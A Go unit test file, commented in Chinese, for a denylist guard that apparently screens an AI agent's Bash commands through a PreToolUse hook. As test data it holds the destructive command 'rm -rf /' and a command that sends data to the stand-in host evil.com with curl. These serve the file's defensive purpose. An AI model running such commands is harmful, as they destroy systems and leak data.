package chain

import (
	"strings"
	"testing"
)

func TestDenied_命中内置默认(t *testing.T) {
	bl := DefaultDenylist()
	if !Denied("rm -rf /", bl) {
		t.Error("rm -rf 应被默认黑名单拦")
	}
	if Denied("ls -la", bl) {
		t.Error("普通命令不应被拦")
	}
}

func TestDenied_合并段追加(t *testing.T) {
	bl := MergeDenylist(DefaultDenylist(), []string{"curl evil.com"})
	if !Denied("curl evil.com --data x", bl) {
		t.Error("段追加项应生效")
	}
}

func TestSettingsJSON_含PreToolUse与guard(t *testing.T) {
	s := SettingsJSON("ccr")
	if !strings.Contains(s, "PreToolUse") || !strings.Contains(s, "__chain_guard") {
		t.Errorf("settings 应含 PreToolUse 钩子调 __chain_guard: %s", s)
	}
}

func TestCommandFromHookInput(t *testing.T) {
	cmd := CommandFromHookInput([]byte(`{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}`))
	if cmd != "rm -rf /" {
		t.Errorf("应取出 Bash 命令, got %q", cmd)
	}
	if CommandFromHookInput([]byte("not json")) != "" {
		t.Error("坏 JSON 应返回空串")
	}
}
